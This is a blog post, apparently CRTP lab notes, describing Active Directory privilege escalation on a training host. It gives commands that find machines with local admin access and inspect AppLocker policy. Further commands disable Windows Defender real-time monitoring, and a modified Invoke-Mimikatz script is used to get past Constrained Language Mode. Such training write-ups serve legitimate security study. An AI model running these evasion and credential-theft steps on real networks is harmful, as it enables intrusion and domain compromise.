---
title: Active Directory (AD) | Local Privilege Escalation (Part 3)
date: 2024-07-03 00:00:00 +0800
categories: [Cert, CRTP]
tags: [Cert,Active Directory]     ## TAG names should always be lowercase
render_with_liquid: false
description: Designed to provide a comprehensive guide to Active Directory (AD) attack techniques
---

## **Step 6: Derivative Local Admin Escalation**

**Objective**: Escalate privileges to domain admin using derivative local admin access on dcorp-adminsrv.

### **Identify Machines with Local Admin Access**
- Use Find-PSRemotingLocalAdminAccess.ps1 PowerShell script to identify machines where local admin privileges are available.

```bash
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
```
- Note down dcorp-adminsrv as having local admin privileges.


### **Check Applocker Configuration**

- Verify Applocker policy on dcorp-adminsrv to understand script execution permissions.

```bash
winrs -r:dcorp-adminsrv reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script
```

- Confirm the presence of Applocker rules allowing scripts from %PROGRAMFILES% and %WINDIR%.

### **Inspect Applocker Policy via PowerShell**

- Enter a PowerShell session on dcorp-adminsrv to check Applocker policy details.

```bash
Enter-PSSession dcorp-adminsrv
$ExecutionContext.SessionState.LanguageMode  # Confirm Constrained Language Mode
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

- Ensure scripts from %PROGRAMFILES% are allowed for the Everyone group.

### **Disable Windows Defender Real-time Monitoring**

- Disable Windows Defender real-time monitoring on dcorp-adminsrv to evade antivirus detection.

```bash
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
```

### **Modify and Transfer Invoke-Mimikatz**

- Due to Constrained Language Mode restrictions, modify Invoke-Mimikatz.ps1 to embed function calls and create Invoke-MimikatzEx.ps1.
- Transfer the modified script (Invoke-MimikatzEx.ps1) from your local machine to dcorp-adminsrv.
